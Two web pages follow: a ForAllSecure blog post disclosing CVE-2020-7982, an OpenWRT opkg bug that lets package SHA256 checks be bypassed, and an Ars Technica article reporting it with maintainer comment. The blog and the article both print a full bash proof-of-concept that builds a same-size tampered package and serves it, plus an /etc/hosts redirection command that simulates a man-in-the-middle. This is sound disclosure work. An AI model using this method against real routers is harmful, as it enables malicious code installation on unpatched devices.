=== Content from blog.forallsecure.com_7b710b77_20250119_113928.html ===


Cookie Consent

By clicking **âAcceptâ**, you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts. View our [Privacy Policy](/privacy-policy) for more information.

![deny icon
](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/643e8101b187e58a19307ebe_deny-icon3.svg)Deny![allow icon
](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/643e8101b187e547f9307ebf_allow-icon3.svg)Accept[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/6605b36c9570e3a8ef4eb83d_Mayhem-logo-lightbg-RGB%403x.png)](/)

Why Mayhem[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Why Mayhem

Built by hackers, Powered by AI.](/why-mayhem)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Mayhem for Enterprise

One platform to meet all your needs.](/mayhem-for-enterprise)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Mayhem for Automotive

Defense against automotive cyber threats.](/automotive-software-testing)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Mayhem for Aerospace

Put your security testing on autopilot.](/mayhem-for-aerospace-aviation)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Mayhem for Federal

Mayhem uncovers new vulnerabilities.](/federal)

Products[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Dynamic SBOM

Find - and fix - what matters.](/dynamic-sbom)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Code Security

Mayhem tests your applications like a hacker.](/mayhem-code-security)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)APIÂ Security

Continuous verification of your API.](/api-security)

Resources[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Docs & Tutorials

Learn how Mayhem works.](https://app.mayhem.security/docs)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Events

Upcoming events with the Mayhem team.](/events)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Blog

News and updates on security testing.](/blog)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Press

Media coverage and press releases.](/press)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/642fcb0cf0c0b9f199bb05cf_icon-placeholder.svg)Case Studies

See Mayhem at work.](/mayhem-case-studies)Whitepapers

Download our guides & one pagers.

[Your Ultimate Guide To Fuzz Testing](/your-ultimate-guide-to-fuzzing)[Your Ultimate Guide to Application Software Testing](/ultimate-guide-to-application-security-testing)[The Buyerâs Guide to Mayhem and Comprehensive Application Security](/the-buyers-guide-to-mayhem-and-comprehensive-application-security)[The Ultimate Guide to API Fuzzing](/the-ultimate-guide-to-api-fuzzing)Join the conversationGet Started[Get a Demo](/schedule-a-demo)[All Posts](/blog)
# Uncovering OpenWRT Remote Code Execution (CVE-2020-7982)

![]()Guido VrankenMarch 26, 2020Thank you! Your submission has been received!Oops! Something went wrong while submitting the form.![](https://cdn.prod.website-files.com/642ff36ffc25dbd051b78339/643541191d4aec8f0ff5c244_KHfN4knuQ0i8a8Cs8hXp.png)
# Introduction: Fuzzing OpenWRT

For ForAllSecure, Iâve been focusing on finding bugs in OpenWRT using their [Mayhem software](https://forallsecure.com/mayhem-for-code). My research on OpenWRT has been a combination of writing custom harnesses, running binaries of the box without recompilation, and manual inspection of code.

I found this vulnerability initially by chance when I was preparing a Mayhem task for opkg.

Mayhem can serve data either from a file or from a network socket.

opkgÂ downloads packages fromÂ downloads.openwrt.org, so my plan was to let this domain name point toÂ 127.0.0.1Â from which Mayhem is serving.

To test if opkg would indeed download packages from a custom network connection, I set up a local web server and created a file consisting of random bytes. When I ran opkg to install a package, it retrieved the file as I had intended, and then threw a segmentation fault.

I didnât understand why an invalid package would cause this error. After all, the package shouldnât be processed if the SHA256 hash was incorrect.

My initial hunch was that opkg would download the package, unpack it to a temporary directory, and only then verify the SHA256 hash before definitively installing it to the system. I suspected that the unpacker couldnât deal with malformed data, like the file with random bytes served from my web server.

Further inspection showed that the SHA256 hash wasnât checked at all, which is the basis of the vulnerability at hand.

I was right about the unpacker being buggy, though; malformed data would lead to a variety of memory violations.

Once I confirmed that opkg would attempt to unpack and installÂ *any*Â package it downloads, I was able to recreate the findings with Mayhem with just a slight modification to opkg.

I set up a Mayhem task forÂ opkg install attrÂ (attr is a small OpenWRT package), and implicitly, Mayhem was able to find the remote code execution bug, by detecting the memory bugs in the package unpacker. If OpenWRTâs SHA256 verification had worked as intended, opkg would simply discard the package and not process it, and no segmentation faults would transpire.

Mayhem is capable of fuzzing binaries without recompilation or instrumentation. Coming from a workflow that involves writing many custom harnesses for software libraries (which Mayhem also supports), this has been a delightful experience and it has allowed me to set up targets for dozens of OpenWRT applications in just weeks, and more vulnerability disclosures are forthcoming.

In the following sections, Iâll dive deeper into how I identified the vulnerability.

# OpenWRT

[OpenWRT](https://openwrt.org/)Â is a free, Linux-based operating system geared towards use in embedded devices in general and network routers in particular. By all accounts it is installed on millions of devices across the world.

# The OpenWRT Package Manager

To install or update software on an OpenWRT system such as an OpenWRT web server, a utility calledÂ opgkÂ is used. Its functionality and purpose are comparable toÂ aptÂ on Debian-based systems.

opkgÂ retrieves the lists of package available for installation fromÂ downloads.openwrt.orgÂ over an unencrypted HTTP connection.

The package lists are digitally signed. This ensures that before the package file is processed, it is verified to come from the OpenWRT maintainers, and discarded if verification fails.

A typical entry in Packages looks like this:

```
Package: attr
Version: 2.4.48-2
Depends: libc, libattr
License: GPL-2.0-or-later
Section: utils
Architecture: x86_64
Installed-Size: 11797
Filename: attr_2.4.48-2_x86_64.ipk
Size: 12517
SHA256sum: 10f4e47bf6b74ac1e49edb95036ad7f9de564e6aba54ccee6806ab7ace5e90a6
Description: Extended attributes support
This package provides xattr manipulation utilities
- attr
- getfattr
- setfattr
```

â

TheÂ SHA256sumÂ field is there to ensure that a downloaded package is not corrupted or compromised. The expected SHA256 hash is implicitly guaranteed to come from the OpenWRT maintainers, because the package list that embeds it, is itself verified with a valid signature.

In theory this means that through the use of signatures nor the package list, nor a package archive can be tampered even though the transport channel (HTTP) is by itself insecure.

Some discussion about this way of reasoning can be foundÂ [here](https://whydoesaptnotusehttps.com/).

### Fuzz Testing is a Proven Technique for Uncovering Zero-Days.

See other zero-days Mayhem, a ForAllSecure fuzz testing technology, has found.

### [**Learn More**](https://forallsecure.com/vulnerabilities-lab) [**Request Demo**](https://forallsecure.com/request-demo)

# The Bug

When the user installs a package by runningÂ opkg install <package>,Â opkgÂ starts by parsing the package lists.

The parser traverses each package entry and performs different actions for each type of field. Once it comes across theÂ SHA256sumÂ field, it will callÂ pkg\_set\_sha256:

```
else if ((mask & PFM_SHA256SUM) && is_field("SHA256sum", line))
pkg_set_sha256(pkg, line + strlen("SHA256sum") + 1);
```

[Source](https://git.openwrt.org/?p=project/opkg-lede.git;a=blob;f=libopkg/pkg_parse.c;h=0baa4db396569be816386b50568c57e12d1cd98c;hb=80d161eb5b95ceb51db989196405eaa00950e03b#l312)

pkg\_set\_sha256 will attempt to decode the SHA256sum field from hexadecimal to binary and store it in an internal representation:

```
 char *pkg_set_sha256(pkg_t *pkg, const char *cksum)
{
size_t len;
char *p = checksum_hex2bin(cksum, &len);

if (!p || len != 32)
return NULL;

return pkg_set_raw(pkg, PKG_SHA256SUM, p, len);
}
```

[Source](https://git.openwrt.org/?p=project/opkg-lede.git;a=blob;f=libopkg/pkg.c;h=e5bfe6f61b67583c00e528fb381162ace308dc13;hb=80d161eb5b95ceb51db989196405eaa00950e03b#l244)

However, if decoding fails, it silently fails without storing the hash.

The actual bug is in checksum\_hex2bin. It is fairly easy to overlook. Can you spot it?

```
 char *checksum_hex2bin(const char *src, size_t *len)
{
size_t slen;
unsigned char *p;
const unsigned char *s = (unsigned char *)src;
static unsigned char buf[32];

if (!src) {
*len = 0;
return NULL;
}

while (isspace(*src))
src++;

slen = strlen(src);

if (slen > 64) {
*len = 0;
return NULL;
}

for (p = buf, *len = 0;
slen > 0 && isxdigit(s[0]) && isxdigit(s[1]);
slen--, s += 2, (*len)++)
*p++ = hex2bin(s[0]) * 16 + hex2bin(s[1]);

return (char *)buf;
}
```

[Source](https://git.openwrt.org/?p=project/opkg-lede.git;a=blob;f=libopkg/file_util.c;h=61ff736cd2c82a224cb10f48d14532b8224bd792;hb=80d161eb5b95ceb51db989196405eaa00950e03b#l234)

Initially, the s and src variables point to the same address.

On line 246, the src variable is advanced to the first non-space character. However, the actual decoding, which happens inside the for loop starting on line 256 operates on the s variable, which still points to the very start of the string.

Hence, if the input string has any leading spaces, this will attempt to decode the space character. The space is not a hexadecimal character, so isxdigit() returns false, and the decoder loop will exit immediately, leaving \*len set to 0.

If we look at the package parser again, we see that the string passed to pkg\_set\_sha256 is the part of the line after “SHA256sum:

```
pkg_set_sha256(pkg, line + strlen("SHA256sum") + 1);
```

In effect, this means that the first character of that string is a space.

After the package list parsing has completed, the package is downloaded, again over HTTP.

Several verification steps follow.

The size of the downloaded package must be equal to that specified in the package list:

```
pkg_expected_size = pkg_get_int(pkg, PKG_SIZE);

if (pkg_expected_size > 0 && pkg_stat.st_size != pkg_expected_size) {
if (!conf->force_checksum) {
opkg_msg(ERROR,
"Package size mismatch: %s is %lld bytes, expecting %lld bytes\n",
pkg->name, (long long int)pkg_stat.st_size, pkg_expected_size);
return -1;
} else {
opkg_msg(NOTICE,
"Ignored %s size mismatch.\n",
pkg->name);
}
}
```

[Source](https://git.openwrt.org/?p=project/opkg-lede.git;a=blob;f=libopkg/opkg_install.c;h=27c9484cfb8189e42cbc073eaa14a67c71c3507a;hb=80d161eb5b95ceb51db989196405eaa00950e03b#l1379)

And if a SHA256 hash was specified for this package, it must match:

```
/* Check for sha256 value */
pkg_sha256 = pkg_get_sha256(pkg);
if (pkg_sha256) {
file_sha256 = file_sha256sum_alloc(local_filename);
if (file_sha256 && strcmp(file_sha256, pkg_sha256)) {
if (!conf->force_checksum) {
opkg_msg(ERROR,
"Package %s sha256sum mismatch. "
"Either the opkg or the package index are corrupt. "
"Try 'opkg update'.\n", pkg->name);
free(file_sha256);
return -1;
} else {
opkg_msg(NOTICE,
"Ignored %s sha256sum mismatch.\n",
pkg->name);
}
}
if (file_sha256)
free(file_sha256);
}
```

â

But becauseÂ checksum\_hex2binÂ was not able to decode theÂ SHA256sumÂ field, the code from line 1418 onwards is simply bypassed.

It looks like the bug was introduced in February 2017, almost three years ago:Â <https://git.openwrt.org/?p=project/opkg-lede.git;a=blobdiff;f=libopkg/file_util.c;h=155d73b52be1ac81d88ebfd851c50c98ede6f012;hp=912b147ad306766f6275e93a3b9860de81b29242;hb=54cc7e3bd1f79569022aa9fc3d0e748c81e3bcd8;hpb=9396bd4a4c84bde6b55ac3c47c90b4804e51adaf>

# Exploitation

For exploitation it is required that the attacker serves (compromised) packages from a web server.

The attacker must either be in a position to intercept and replace communication between the device andÂ downloads.openwrt.org, or control the DNS server used by the device to makeÂ downloads.openwrt.orgÂ point to a web server controlled by the attacker.

Attacks on a local network using packet spoofing or ARP cache poisoning might be possible, but this has not been tested.

The sole constraint to reckon with is that the file size of compromised package must match theÂ SizeÂ field in the package list.

Doing this is trivial:

* Create a package that is smaller than the original
* Compute the size difference between the original package and the compromised package
* Append this amount of zero bytes to the end of the compromised package

The following proof-of-concept demonstrates how exploitation may be achieved:

```
#!/bin/bash

# Download the package lists for mirroring
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.gz
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.sig
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.gz
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.sig
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.gz
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.sig
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.gz
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.sig
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.gz
wget -x http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.sig
wget -x http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.gz
wget -x http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.sig

mv downloads.openwrt.org/snapshots .rm -rf downloads.openwrt.org/

# Get the original package
wget http://downloads.openwrt.org/snapshots/packages/x86_64/packages/attr_2.4.48-2_x86_64.ipk
ORIGINAL_FILESIZE=$(stat -c%s "attr_2.4.48-2_x86_64.ipk")
tar zxf attr_2.4.48-2_x86_64.ipk
rm attr_2.4.48-2_x86_64.ipk

# Extract the binaries
mkdir data/
cd data/
tar zxvf ../data.tar.gz
rm ../data.tar.gz

# Build the replacement binary. It is a very small program that prints a string.
rm -f /tmp/pwned.asm /tmp/pwned.o
echo "section .text" >>/tmp/pwned.asm
echo "global _start" >>/tmp/pwned.asm
echo "_start:" >>/tmp/pwned.asm
echo " mov edx,len" >>/tmp/pwned.asm
echo " mov ecx,msg" >>/tmp/pwned.asm
echo " mov ebx,1" >>/tmp/pwned.asm
echo " mov eax,4" >>/tmp/pwned.asm
echo " int 0x80" >>/tmp/pwned.asm
echo " mov eax,1" >>/tmp/pwned.asm
echo " int 0x80" >>/tmp/pwned.asm
echo "section .data" >>/tmp/pwned.asm
echo "msg db 'pwned :)',0xa" >>/tmp/pwned.asm
echo "len equ $ - msg" >>/tmp/pwned.asm

# Assemble
nasm /tmp/pwned.asm -f elf64 -o /tmp/pwned.o

# Link
ld /tmp/pwned.o -o usr/bin/attr

# Pack into data.tar.gz
tar czvf ../data.tar.gz *
cd ../

# Remove files no longer needed
rm -rf data/

# Pack
tar czvf attr_2.4.48-2_x86_64.ipk control.tar.gz data.tar.gz debian-binary

# Remove files no longer needed
rm control.tar.gz data.tar.gz debian-binary

# Compute the size difference between the original package and the compromised package
MODIFIED_FILESIZE=$(stat -c%s "attr_2.4.48-2_x86_64.ipk")
FILESIZE_DELTA="$(($ORIGINAL_FILESIZE-$MODIFIED_FILESIZE))"

# Pad the modified file to the expected size
head /dev/zero -c$FILESIZE_DELTA >>attr_2.4.48-2_x86_64.ipk

# Download the dependency of attr
wget http://downloads.openwrt.org/snapshots/packages/x86_64/packages/libattr_2.4.48-2_x86_64.ipk

# Position the files for serving from the web server
mkdir -p snapshots/packages/x86_64/packages/
mv attr_2.4.48-2_x86_64.ipk snapshots/packages/x86_64/packages/
mv libattr_2.4.48-2_x86_64.ipk snapshots/packages/x86_64/packages/

# Launch a basic web server that opkg will be connecting to
sudo python -m SimpleHTTPServer 80
```

If we assume that the web server IP is 192.168.2.10, running following commands on an OpenWRT system:

```
 echo "192.168.2.10 downloads.openwrt.org" >>/etc/hosts; opkg update && opkg install attr && attr
```

Â

If we assume that the web server IP is 192.168.2.10, running following commands on an OpenWRT system:

echo "192.168.2.10 downloads.openwrt.org" >>/etc/hosts; opkg update && opkg install attr && attr

would printÂ  âpwned :)â before the fixes were implemented.

The modification toÂ /etc/hostsÂ is required to emulate a man-in-the-middle (or compromised DNS) situation.

# Remediation

As a stopgap solution, OpenWRT removed the space in theÂ SHA256sumÂ from the package list shortly after I reported the bug.

This helped mitigate the risk to users somewhat; users who updated their package lists following this change were no longer vulnerable, as subsequent installs would set out from a well-formed list that would not sidestep the hash verification.

However, this is not an adequate long-term solution because an attacker can simply provide an older package list that was signed by the OpenWRT maintainers.

The bug inÂ checksum\_hex2binÂ was fixed inÂ [this commit](https://git.openwrt.org/?p=project/opkg-lede.git;a=commit;h=c09fe2098718807ddbca13ee36e3e38801822946)Â and integrated in OpenWRT versions 18.06.7 and 19.07.1, both released on February 1st 2020.

My recommendation is to upgrade OpenWRT versions to 18.06.7 or 19.07.1.Â

# Notes

Back in 2016, Jann Horn of Google Project ZeroÂ [found a bug](https://www.debian.org/security/2016/dsa-3733)Â with a comparable impact in DebianâsÂ aptÂ package manager.

Last year, another such flawÂ [was discovered](https://justi.cz/security/2019/01/22/apt-rce.html)Â by Max Justicz.

Share this postBlog
## Recent Blogs

[View All](/blog)![](https://cdn.prod.website-files.com/642ff36ffc25dbd051b78339/67410578b8ad96a93f287d00_scout-sbom.png)Code Security
#### Exploring The Best SBOM/SCA Tools: Docker Scout

In this post, we'll explore Docker Scout's strengths and weaknesses as an SBOM/SCA tool and compare vulnerability results before and after runtime analysis.Read More

![](https://cdn.prod.website-files.com/642ff36ffc25dbd051b78339/673509b95c2d8799e6ba07ae_mayhem-security-achieves-soc-2-type-ii-compliance.png)In The News
#### Mayhem Security Achieves SOC 2 Type II Compliance

Mayhem Security is excited to announce that weâve earned our SOC 2 Type II certification!Read More

![](https://cdn.prod.website-files.com/642ff36ffc25dbd051b78339/670939f2d4bf3a5d0088960f_Mayhem%20Apricot.png)
#### Whatâs New In Mayhem 2.10

Discover new features in Mayhem 2.10, including vECU analysis, harness templates, new âdaily defectâ emails, improved registry RBACs, and improved performance.Read More

View all
### How about some Mayhem in your inbox?

Subscribe to our monthly newsletter for expert insights and news on DevSecOps topics, plus Mayhem tips and tutorials.

By subscribing, you're agreeing to our [website terms](/terms-of-use) and [privacy policy](/privacy-policy).Thank you! Your submission has been received!Oops! Something went wrong while submitting the form.
## Add Mayhem to Your DevSecOps for Free.

Get a full-featured 30 day free trial.

[Get Started](/get-started)![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/6476d79ca815acc79767c44d_iStock-830794300.jpg)[![](https://cdn.prod.website-files.com/640f25bd69d9b59a5b153b04/6605b36c9570e3a8ef4eb83d_Mayhem-logo-lightbg-RGB%403x.png)](/)Company[About](/about)[Careers](/careers)[Press](/press)[Events](/events)Support[Docs & Tutorials](https://mayhem.forallsecure.com/docs/overview/)[Contact](/contact)Connect with usÂ© 2024 ForAllSecure[Privacy Policy](/privacy-policy)[Terms of Use](/terms-of-use)Cookies Settings[Code Security](/categories/code-security)
## Complete API Security in 5 Minutes

Get started with Mayhem today for fast, comprehensive, API security.Â

[Get Mayhem](/get-started)
## Maximize Code Coverage in Minutes

Mayhem is an award-winning AI that autonomously finds new exploitable bugs and improves your test suites.

[Get Mayhem](/get-started)

=== Content from arstechnica.com_cc45b011_20250119_113927.html ===


[Skip to content](#main)

[Ars Technica home](https://arstechnica.com/)

Sections

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

* [Feature](/features/)
* [Reviews](/reviews/)
* [Store](/store/)

* [AI](https://arstechnica.com/ai/)
* [Biz & IT](https://arstechnica.com/information-technology/)
* [Cars](https://arstechnica.com/cars/)
* [Culture](https://arstechnica.com/culture/)
* [Gaming](https://arstechnica.com/gaming/)
* [Health](https://arstechnica.com/health/)
* [Policy](https://arstechnica.com/tech-policy/)
* [Science](https://arstechnica.com/science/)
* [Security](https://arstechnica.com/security/)
* [Space](https://arstechnica.com/space/)
* [Tech](https://arstechnica.com/gadgets/)

[Forum](/civis/)

[Subscribe](/store/product/subscriptions/)

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Pin to story

Theme

* HyperLight
* Day & Night
* Dark
* System

Search dialog...

Sign In

Sign in dialog...

Sign in

NOT THE FILE YOU'RE LOOKING FOR

# OpenWRT code-execution bug puts millions of devices at risk

A partial fix mitigates the risk, but the lack of encryption and other weaknesses remain.

[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
–
Mar 31, 2020 4:25 pm

| [52](https://arstechnica.com/information-technology/2020/03/openwrt-is-vulnerable-to-attacks-that-execute-malicious-code/#comments "52 comments")

[![Screenshot of OpenWrt.](https://cdn.arstechnica.net/wp-content/uploads/2020/03/openwrt.png)](https://cdn.arstechnica.net/wp-content/uploads/2020/03/openwrt.png)

Credit:
[OpenWRT](https://openwrt.org/)

Credit:
[OpenWRT](https://openwrt.org/)

Text
settings

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Minimize to nav

For almost three years, OpenWRT—the open source operating system that powers home routers and other types of embedded systems—has been vulnerable to remote code-execution attacks because updates were delivered over an unencrypted channel and digital signature verifications are easy to bypass, a researcher said.

OpenWRT has a loyal base of users who use the freely available package as an alternative to the firmware that comes installed on their devices. Besides routers, OpenWRT runs on smartphones, pocket computers and even laptops and desktop PCs. Users generally find OpenWRT to be a more secure choice because it offers advanced functions and its source code is easy to audit.

Security researcher Guido Vranken, however, recently found that updates and installation files were delivered over unencrypted HTTPs connections, which are open to attacks that allow adversaries to completely replace legitimate updates with malicious ones. The researcher, who works for security firm ForAllSecure, also found that it was trivial for attackers with moderate experience to bypass digital-signature checks that verify a downloaded update as the legitimate one offered by OpenWTR maintainers. The combination of those two lapses makes it possible to send a malicious update that vulnerable devices will automatically install.

## Exploits not for everyone

These code-execution exploits are limited in their scope because adversaries must either be in a position to conduct a [man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) or tamper with the DNS server that a device uses to find the update on the Internet. That means routers on a network that has no malicious users and using a legitimate DNS server are safe from attack. Vranken also speculates that [packet spoofing](https://www.tutorialspoint.com/kali_linux/kali_linux_sniffing_and_spoofing.htm) or [ARP cache poisoning](https://www.techopedia.com/definition/27471/address-resolution-protocol-poisoning-arp-poisoning) may also make attacks possible, but he cautions that he didn’t test either method.

Despite the requirements, many networks connect people who are unknown or untrusted by the device operator. What’s more, attacks that replace router settings pointing to a legitimate DNS to a malicious one are a fact of life on the Internet, as in-the-wild attack [here](https://arstechnica.com/information-technology/2020/03/new-attack-on-home-routers-sends-users-to-spoofed-sites-that-push-malware/), [here](https://arstechnica.com/information-technology/2019/04/ongoing-dns-hijackings-target-unpatched-consumer-routers/), [here](https://arstechnica.com/information-technology/2018/08/in-the-wild-router-exploit-sends-unwitting-users-to-fake-banking-site/), and [here](https://arstechnica.com/information-technology/2016/12/home-routers-under-attack-in-ongoing-malvertisement-blitz/) (to name just a few) demonstrate.

The lack of HTTPS encryption enforcement is one reason for the weakness. The encryption HTTPS provides makes it impossible for for man-in-the-middle attackers to tamper with data while it’s in transit. Authentication assurances built into HTTPS also make it infeasible for attackers to impersonate downloads.openwrt.org, the real OpenWRT server that delivers legitimate updates and installation files. Updates could be installed from either an HTTP or HTTPS version of the downloads server.

Exploiting these weaknesses, Vranken was able to create a server that impersonated downloads.openwrt.org and served a malicious update. As long as the malicious file is the same size at the legitimate file, it was executed by a vulnerable device. In a [post published last week](https://blog.forallsecure.com/uncovering-openwrt-remote-code-execution-cve-2020-7982), the researcher wrote:

> Doing this is trivial:
>
> * Create a package that is smaller than the original
> * Compute the size difference between the original package and the compromised package
> * Append this amount of zero bytes to the end of the compromised package

Vranken supplied the following proof-concept code:

> ```
> #!/bin/bash
>
> # Download the package lists for mirroring
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.gz>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/base/Packages.sig>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.gz>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/luci/Packages.sig>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.gz>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/packages/Packages.sig>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.gz>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/routing/Packages.sig>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.gz>
> wget -x <http://downloads.openwrt.org/snapshots/packages/x86_64/telephony/Packages.sig>
> wget -x <http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.gz>
> wget -x <http://downloads.openwrt.org/snapshots/targets/x86/64/packages/Packages.sig>
>
> mv downloads.openwrt.org/snapshots .
> rm -rf downloads.openwrt.org/
>
> # Get the original package
> wget <http://downloads.openwrt.org/snapshots/packages/x86_64/packages/attr_2.4.48-2_x86_64.ipk>
> ORIGINAL_FILESIZE=$(stat -c%s "attr_2.4.48-2_x86_64.ipk")
> tar zxf attr_2.4.48-2_x86_64.ipk
> rm attr_2.4.48-2_x86_64.ipk
>
> # Extract the binaries
> mkdir data/
> cd data/
> tar zxvf ../data.tar.gz
> rm ../data.tar.gz
>
> # Build the replacement binary. It is a very small program that prints a string.
> rm -f /tmp/pwned.asm /tmp/pwned.o
> echo "section  .text" >>/tmp/pwned.asm
> echo "global   _start" >>/tmp/pwned.asm
> echo "_start:" >>/tmp/pwned.asm
> echo " mov  edx,len" >>/tmp/pwned.asm
> echo " mov  ecx,msg" >>/tmp/pwned.asm
> echo " mov  ebx,1" >>/tmp/pwned.asm
> echo " mov  eax,4" >>/tmp/pwned.asm
> echo " int  0x80" >>/tmp/pwned.asm
> echo " mov  eax,1" >>/tmp/pwned.asm
> echo " int  0x80" >>/tmp/pwned.asm
> echo "section  .data" >>/tmp/pwned.asm
> echo "msg  db  'pwned :)',0xa" >>/tmp/pwned.asm
> echo "len  equ $ - msg" >>/tmp/pwned.asm
>
> # Assemble
> nasm /tmp/pwned.asm -f elf64 -o /tmp/pwned.o
>
> # Link
> ld /tmp/pwned.o -o usr/bin/attr
>
> # Pack into data.tar.gz
> tar czvf ../data.tar.gz *
> cd ../
>
> # Remove files no longer needed
> rm -rf data/
>
> # Pack
> tar czvf attr_2.4.48-2_x86_64.ipk control.tar.gz data.tar.gz debian-binary
>
> # Remove files no longer needed
> rm control.tar.gz data.tar.gz debian-binary
>
> # Compute the size difference between the original package and the compromised package
> MODIFIED_FILESIZE=$(stat -c%s "attr_2.4.48-2_x86_64.ipk")
> FILESIZE_DELTA="$(($ORIGINAL_FILESIZE-$MODIFIED_FILESIZE))"
>
> # Pad the modified file to the expected size
> head /dev/zero -c$FILESIZE_DELTA >>attr_2.4.48-2_x86_64.ipk
>
> # Download the dependency of attr
> wget <http://downloads.openwrt.org/snapshots/packages/x86_64/packages/libattr_2.4.48-2_x86_64.ipk>
>
> # Position the files for serving from the web server
> mkdir -p snapshots/packages/x86_64/packages/
> mv attr_2.4.48-2_x86_64.ipk snapshots/packages/x86_64/packages/
> mv libattr_2.4.48-2_x86_64.ipk snapshots/packages/x86_64/packages/
>
> # Launch a basic web server that opkg will be connecting to
> sudo python -m SimpleHTTPServer 80
> ```

The lack of mandatory HTTPS is a deliberate decision by OpenWRT maintainers to accommodate devices that can only receive package manager files over unencrypted HTTP channels, Jo-Philipp Wich, a longtime contributor to the open-source project said in an interview. (Unlike updates, which are downloaded from a Website and manually installed, packages that add extra functions such as media servers can be downloaded and installed by the devices themselves.) To prevent attackers from exploiting the weakness Vranken found, OpenWRT maintainers require downloaded updates to match the SHA256 [cryptographic hash](https://en.wikipedia.org/wiki/Cryptographic_hash_function) of the legitimate one. If the hashes don’t match, devices aren’t supposed to execute the update.

Vranken, however, found that it was possible to bypass the hash check by adding a space to the beginning of an input string in the checksum\_hex2bin function. Vranken said the bug appears to have been introduced in February 2017.

## The fix

OpenWRT maintainers issued fixes in late January. The mitigation requires new installations to be “set out from a well-formed list that would not sidestep the hash verification." The researcher said described that update as a partial stopgap measure because attackers could replace the legitimate update with an older package list that was signed by the OpenWRT maintainers. From there, attackers can use the same exploits they would use on devices that haven’t received the mitigation.

Wich, however strongly disputed the claim that the most recent updates don't fully address the vulnerability. A patch implemented on January 25 existed on OpenWRT servers only and still left open the possibility that attackers could swap out the legitimate update with an older version. Wich said that OpenWRT maintainers issued a second update on January 29 that patched the checksum bypass vulnerability in the device firmware itself. Once the update is installed it's no longer possible to force malicious packages on devices running OpenWRT.

Updates require users to use a standard browser to download a file and then manually install it on their device. While OpenWRT advisories always send HTTPS versions of the links, man-in-the-middle attackers can still downgrade connections to use HTTP, Wich said. That still makes it possible for man-in-the-middle attackers to downgrade the HTTPS connections to HTTP ones and serve malicious updates. Wich said that maintainers are considering a way to enforce HTTPS when browsers download updates.

OpenWRT users should install either version 18.06.7 or 19.07.1, and ensure the updates are served from an HTTPS connection. Contradicting Vranken's claim that these updates are only a stopgap measure, Wich said the patches permanently repair the vulnerability.

*This post was updated on 4/1/2020 at 12:06 California time to add comment from OpenWRT's Wich.*

Listing image:
[Marco Verch / Flickr](https://www.flickr.com/photos/160866001%40N07/48245783246)

